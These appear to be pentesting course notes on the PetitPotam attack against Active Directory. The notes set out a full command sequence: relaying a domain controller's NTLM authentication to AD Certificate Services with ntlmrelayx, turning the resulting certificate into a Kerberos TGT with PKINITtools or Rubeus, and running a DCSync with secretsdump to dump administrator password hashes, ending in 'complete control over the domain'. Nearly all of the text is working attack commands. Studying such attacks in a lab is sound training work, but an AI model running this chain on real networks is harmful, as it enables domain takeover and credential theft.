([CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942))

on our attack host: 
```shell-session
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```
in another window run petitipotam.py
`python3 PetitPotam.py <attack host IP> <Domain Controller IP>`

for windows we can run it on mimikatz also:
`misc::efs /server:<Domain Controller> /connect:<ATTACK HOST>`.

or there is a powershell implementation of petitpotam as well

go back to the htlmrelayx widow and see if the base64 certificate of user the DC Controller  is there

then we get the TGT
```shell-session
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
```
it will be saved to a file where we need to set it as the environment variable
```shell-session
export KRB5CCNAME=dc01.ccache
```
then we perform a DCSync and retrieve the NTLM password hashes for the domain
```shell-session
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```
can use [[Crackmapexec]] with the hash to see if the credential is correct. From here, we have compete control over the domain. 

we can also try to submit a tgs request after getting the TGT
```shell-session
python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
```

then we can use the hash we get to perform a DCSync 
```shell-session
ecretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
```

Alternatively, once we obtain the base64 certificate via ntlmrelayx.py, we could use the certificate with the Rubeus tool on a Windows attack host to request a TGT ticket and perform a pass-the-ticket (PTT) attack all at once.
```powershell-session
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt
```

can also perform a [DCSync](3%20Exploitation/Active%20Directory%20Attacks/DCSync.md) with mimikatz